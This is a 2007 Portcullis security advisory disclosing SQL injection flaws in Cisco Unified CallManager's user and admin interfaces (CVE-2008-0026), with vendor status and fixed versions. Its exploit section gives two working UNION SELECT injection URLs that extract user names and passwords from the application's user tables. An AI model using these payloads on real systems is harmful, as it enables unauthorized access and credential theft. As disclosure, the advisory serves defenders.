Portcullis Security Advisory			07_016

 
Vulnerable System: 

Cisco Unified CallManager

 
Vulnerability Title:  

Multiple SQL Injections In User And Admin Interface


Vulnerability discovery and development: 

Nico Leidecker of Portcullis Computer Security Ltd discovered this
vulnerability. Further research was then carried out.


Affected systems: 

System Version: 5.0.4.2000-1 and 5.1, 6.0-6.1.

 
Details:

The Cisco Unified CallManager is vulnerable to multiple SQL injections in the
user interface as well as in the administration interface. 

The value of the 'key' parameter used in various GET requests is not properly
sanatized and it is therefore possible to inject SQL queries.

In addition, the application discloses table and attribute names in the
'primaryTable'and 'dispCols' parameters of some POST requests. Another SQL injection point
can be found there.

The following is a simplified POST request:
 
POST 
/ccmuser/personaladdressbookFindList.do?%3C%=reqParams%%3E&recCnt=1&colCnt=4
HTTP/1.1
Host: example.org
Referer: https://example.org/ccmuser/personaladdressbookFindList.do
Cookie: JSESSIONID=D650CB2B43F85CD8D260B69A948FA7B5;
JSESSIONIDSSO=315C472AA4B90A6765D4EDEFAC24897C
Content-Length: 170

org.apache.struts.taglib.html.TOKEN=9a4f6e1e4e11a72ed4be0981c26e6f53&
primaryTable=personaladdressbook&dispCols=pkid%23nickname%23firstname%23lastname&
searchField=nickname

Impact:

Attackers need access to either the user or administration interface. They then
might be able to read data from the database such as password hashes.

Exploit:

Proof of concept exploit code is not required. The injection points are the 'key' or the 
primaryTable' and 'dispCols' parameters.
  
E.g.: 

https://example.org/ccmuser/personaladdressbookEdit.do?key='+UNION+ALL+
SELECT+'','',firstname,lastname,userid,password+from+enduser;-- 

or

https://example.org/ccmuser/personaladdressbookEdit.do?key='+UNION+ALL+
SELECT+'','','',user,'',password+from+applicationuser;-- 

Vendor Status:

Vendor contacted -   Cisco advise that they will be  using bug ID CSCsk64286 for this incident.
CVE-2008-0026 has been assiged to this vulnerability. 
The Cisco advisory is now available at:-

http://www.cisco.com/warp/customer/707/cisco-sa-20080213-cucmsql.shtml

The vendor has advised that the CUCM versions not vulnerable to this issue are 5.1(3a) and 6.1(1a).


Copyright: 
 
Copyright © Portcullis Computer Security Limited 2007, All rights reserved 
worldwide. 
Permission is hereby granted for the electronic redistribution of this 
information. It is not to be edited or altered in any way without the express 
written consent of Portcullis Computer Security Limited.

Disclaimer: 
 
The information herein contained may change without notice. Use of this 
information constitutes acceptance for use in an AS IS condition. There are 
NO warranties, implied or otherwise, with regard to this information or its 
use. Any use of this information is at the user's risk. In no event shall the 
author/distributor (Portcullis Computer Security Limited) be held liable for 
any damages whatsoever arising out of or in connection with the use or spread 
of this information.
